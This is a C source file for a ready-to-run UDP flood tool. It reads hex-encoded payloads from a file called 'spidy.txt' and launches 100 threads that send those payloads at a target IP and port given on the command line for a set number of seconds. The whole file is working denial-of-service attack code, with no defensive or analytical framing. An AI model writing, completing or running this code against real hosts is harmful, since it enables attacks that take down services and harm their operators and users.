#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>

#define THREAD_COUNT 100
#define MAX_PAYLOADS 1000
#define MAX_PAYLOAD_SIZE 512
#define PAYLOAD_FILE "spidy.txt"

char *payloads[MAX_PAYLOADS];
int payload_lengths[MAX_PAYLOADS];
int payload_count = 0;

char target_ip[64];
int target_port;
int attack_time;

// Load payloads from spidy.txt
void load_payloads() {
    FILE *fp = fopen(PAYLOAD_FILE, "r");
    if (!fp) {
        perror("spidy.txt open failed");
        exit(EXIT_FAILURE);
    }

    char line[2048];
    while (fgets(line, sizeof(line), fp) && payload_count < MAX_PAYLOADS) {
        size_t len = strlen(line);
        if (line[len - 1] == '\n') line[len - 1] = '\0';

        char *decoded = malloc(MAX_PAYLOAD_SIZE);
        int i = 0;
        char *token = strtok(line, "\\x");
        while (token) {
            if (strlen(token) == 2) {
                unsigned int byte;
                sscanf(token, "%2x", &byte);
                decoded[i++] = (char)byte;
            }
            token = strtok(NULL, "\\x");
        }
        payloads[payload_count] = decoded;
        payload_lengths[payload_count] = i;
        payload_count++;
    }

    fclose(fp);
}

// Flood function
void *flood(void *arg) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) pthread_exit(0);

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(target_port);
    addr.sin_addr.s_addr = inet_addr(target_ip);

    time_t end = time(NULL) + attack_time;

    while (time(NULL) < end) {
        int idx = rand() % payload_count;
        sendto(sock, payloads[idx], payload_lengths[idx], 0, (struct sockaddr *)&addr, sizeof(addr));
    }

    close(sock);
    pthread_exit(0);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <IP> <PORT> <TIME>\n", argv[0]);
        return 1;
    }

    strncpy(target_ip, argv[1], sizeof(target_ip));
    target_port = atoi(argv[2]);
    attack_time = atoi(argv[3]);

    load_payloads();
    srand(time(NULL));

    pthread_t threads[THREAD_COUNT];
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_create(&threads[i], NULL, flood, NULL);
        usleep(10000);
    }

    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}
